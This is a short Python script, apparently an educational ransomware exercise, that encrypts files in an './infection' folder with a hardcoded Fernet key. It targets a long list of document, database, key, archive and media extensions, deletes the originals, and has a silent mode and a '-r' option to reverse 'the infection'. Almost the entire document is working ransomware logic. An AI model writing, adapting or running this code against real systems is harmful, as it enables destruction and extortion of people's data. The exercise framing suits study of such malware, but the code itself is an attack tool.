#!/usr/bin/env python3

import argparse
import os
from cryptography.fernet import Fernet
import base64

password = base64.urlsafe_b64encode(bytes.fromhex("cb3b0eefc4b970b8a0a2b9263f851997eeeaba6ef213571fe7f3d9a4f1bd34d0"))
extensions = [".ft", ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]

def encrypt_text(text:str, file:tuple):
    crypted_text = cipher_suite.encrypt(text.encode())
    try:
        with open(file[0] + '.ft', 'wb') as file_w:
                file_w.write(crypted_text)
    except:
        print(f"Error encrypting {file[0] + file[1]}")
    if file[1] != ".ft":
        os.remove(file[0] + file[1])

def decrypt_text(text:str, file:str):
    decrypted_text = cipher_suite.decrypt(text.encode())
    with open(file, 'wb') as file_w:
              file_w.write(decrypted_text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', type=str, help='Revierte la infección desencriptando los archivos previamente encriptados')
    parser.add_argument('-s', action="store_true", help='El programa no produce ningún output')
    args = parser.parse_args()

    cipher_suite = Fernet(password)

    try:
        files = os.listdir("./infection")

        for file in files:
            file = "./infection/" + file

            if os.path.splitext(file)[1] in extensions:
                with open(file, 'r') as file_r:
                    text = file_r.read()
                if (args.r):
                    decrypt_text(text, file)
                else:
                    encrypt_text(text, os.path.splitext(file))
                if (args.s == False):
                    print(file)

    except:
         print("Error")
         exit()

